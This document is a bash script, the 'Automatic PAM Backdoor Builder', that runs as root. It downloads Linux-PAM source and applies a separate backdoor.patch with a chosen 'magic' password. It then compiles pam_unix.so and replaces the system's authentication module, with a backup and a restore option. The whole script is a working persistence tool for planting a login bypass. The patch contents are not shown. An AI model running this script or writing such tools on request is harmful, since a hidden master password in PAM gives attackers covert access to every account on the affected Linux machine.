#!/bin/bash

OPTIND=1
PAM_VERSION=""
PAM_FILE=""
PASSWORD=""
PAM_DEST="/lib/x86_64-linux-gnu/security/pam_unix.so"
BACKUP_PATH="/lib/x86_64-linux-gnu/security/pam_unix.so.bak"

DEPENDENCIES=(
    autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl 
    flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev 
    libselinux1-dev libtool libcrypt-dev libxml2-utils make 
    pkg-config sed w3m xsltproc xz-utils gcc wget
)

echo "--------------------------------------"
echo "   Automatic PAM Backdoor Builder     "
echo "--------------------------------------"

function show_help {
    echo "Usage: $0 [-v version] -p password [--restore]"
    echo ""
    echo "Options:"
    echo "  -v          Specify Linux-PAM version (e.g., 1.3.1)."
    echo "  -p          The 'magic' password for the backdoor."
    echo "  --restore   Restore original PAM and offer reboot."
    echo "  -h, --help  Show help message."
}

function offer_reboot {
    echo ""
    while true; do
        read -p "Task complete. Would you like to reboot now? (y/n): " yn
        case $yn in
            [Yy]* ) 
                echo "Rebooting system..."
                reboot
                break;;
            [Nn]* ) 
                echo "Exiting. Changes may require a restart to take effect."
                exit 0;;
            * ) echo "Please answer y or n.";;
        esac
    done
}

if [[ $EUID -ne 0 ]]; then
   echo "Error: This script must be run as root."
   exit 1
fi

for arg in "$@"; do
    if [[ "$arg" == "--restore" ]]; then
        if [ -f "$BACKUP_PATH" ]; then
            echo "Restoring original module..."
            cp "$BACKUP_PATH" "$PAM_DEST"
            offer_reboot
        else
            echo "Error: Backup file $BACKUP_PATH not found."
            exit 1
        fi
    fi
done

function check_dependencies {
    echo "Checking dependencies..."
    MISSING_PKGS=()
    for pkg in "${DEPENDENCIES[@]}"; do
        if ! dpkg -s "$pkg" >/dev/null 2>&1; then
            MISSING_PKGS+=("$pkg")
        fi
    done

    if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
        apt update && apt install -y "${MISSING_PKGS[@]}"
    fi
}

while getopts ":h:?:p:v:" opt; do
    case "$opt" in
    h|\?) show_help; exit 0 ;;
    v)    PAM_VERSION="$OPTARG" ;;
    p)    PASSWORD="$OPTARG" ;;
    esac
done

if [ -z "$PASSWORD" ]; then
    echo "Error: Password (-p) is required."
    exit 1
fi

check_dependencies

if [ -z "$PAM_VERSION" ]; then
    PAM_VERSION=$(dpkg -s libpam-modules | grep '^Version' | cut -d' ' -f2 | cut -d'-' -f1)
    echo "Detected Version: $PAM_VERSION"
fi

PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
PAM_FILE="v${PAM_VERSION}.tar.gz"
PAM_DIR="linux-pam-${PAM_VERSION}"

wget -c "${PAM_BASE_URL}/${PAM_FILE}" || { echo "Download failed"; exit 1; }
tar xzf "$PAM_FILE"

if [ -f "backdoor.patch" ]; then
    sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch | patch -p1 -d "$PAM_DIR"
else
    echo "Error: backdoor.patch missing."
    exit 1
fi

cd "$PAM_DIR"
if [[ ! -f "./configure" ]]; then ./autogen.sh; fi 
./configure --libdir=/lib/x86_64-linux-gnu
make

if [ -f "modules/pam_unix/.libs/pam_unix.so" ]; then
    cp modules/pam_unix/.libs/pam_unix.so ../pam_unix.so
    cd ..
    
    echo "Build successful. Backing up original..."
    [ ! -f "$BACKUP_PATH" ] && cp "$PAM_DEST" "$BACKUP_PATH"
    
    echo "Installing backdoored module to $PAM_DEST..."
    cp ./pam_unix.so "$PAM_DEST"
    
    offer_reboot
else
    echo "Error: Build failed."
    exit 1
fi
